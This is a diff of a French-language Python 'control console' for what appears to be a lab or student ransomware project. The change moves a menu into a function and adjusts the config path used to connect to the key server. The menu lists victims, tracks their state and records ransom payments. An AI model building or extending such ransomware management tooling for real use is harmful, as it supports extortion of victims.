@@ -12,6 +12,14 @@ from utile import message
 import pickle
 
 
+def print_menu():
+    print('CONSOLE DE CONTRÔLE'
+              '\n==================='
+              '\n1) Liste des victimes du ransomware'
+              '\n2) Historique des états d''une victime'
+              '\n3) Renseigner le paiement de rançon d' 'une victime'
+              '\n4) Quitter')
+
 def main():
     """ Console de contrôle """
     # Key server start
@@ -19,7 +27,7 @@ def main():
     # Création de la socket de connexion
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # On se connecte
-    s.connect((config.get_ip("../config.json"), config.get_port("../config.json")))
+    s.connect((config.get_ip("//config.json"), config.get_port("//config.json")))
     # 19 ainsi il est initalisé à une variable impossible à atteindre
     choix = "19"
     # hasAsked 1 Before = Check si il a demander un listing avant
@@ -28,12 +36,7 @@ def main():
     key_f = security.diffie_hellman_recv_key(s)
     while choix != '4':
         # On demande un choix plus cohérent basé sur le menu plus haut
-        print('CONSOLE DE CONTRÔLE'
-              '\n==================='
-              '\n1) Liste des victimes du ransomware'
-              '\n2) Historique des états d''une victime'
-              '\n3) Renseigner le paiement de rançon d' 'une victime'
-              '\n4) Quitter')
+        print_menu()
         choix = input('Votre choix : ')
         print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         if choix == '1':
